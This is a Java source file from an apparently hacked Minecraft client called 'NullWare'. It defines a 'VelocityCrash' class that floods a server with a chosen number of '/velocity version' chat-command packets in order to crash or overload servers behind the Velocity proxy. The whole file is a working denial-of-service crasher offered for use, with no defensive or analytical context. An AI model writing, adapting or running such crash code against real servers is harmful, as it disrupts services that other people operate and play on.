package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class VelocityCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        sendMessage("Sending Velocity version request...");
        for (int i = 0; i < packets; i++) {
            mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/velocity version"));
        }
    }
}